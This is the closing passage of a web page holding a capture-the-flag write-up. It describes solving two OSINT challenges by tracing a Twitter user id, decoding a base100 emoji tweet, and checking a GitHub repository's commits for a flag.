<p>The id turned out to be a Twitter id, which we can access using <a href="https://twitter.com/i/user/1778675777287901184">twitter.com/i/user/1778675777287901184</a> which takes us to user&rsquo;s profile by the name of @thomasmorte.</p>
<p>One of their tweets is:</p>
<pre tabindex="0"><code>Base is the Boss
👋🐺👋🐽👯👊👋👁👲👮🐪👣👚👦👤👜👖👫🐧👖👫👟🐪👖👜👤👦👡👠👖👞🐫👤👜👴
</code></pre><p>We can then decode using base100 to get the flag using <a href="https://www.dcode.fr/base100-emoji-encoding">https://www.dcode.fr/base100-emoji-encoding</a></p>
<h2 id="eye-site---github-investigation">EYE SITE - GitHub Investigation</h2>
<p><img src="/writeups/sniphers/images/eye_sight.png" alt="Eye Site Challenge"></p>
<p>We are given a URL: thomas-morte.github.io. As you can probably tell it&rsquo;s hosted on GitHub, a quick search on GitHub takes us to the repo and then we can check the commits to get the flag.</p>
<p><img src="/writeups/sniphers/images/github.png" alt="GitHub Flag"></p>
<p>These were the challenges that we were able to solve during the CTF! Thank you for reading.</p>

    </div>
  
  <div class="posts">
    

    <div class="pagination">
  <div class="pagination__buttons">
    
    
    
  </div>
</div>

  </div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
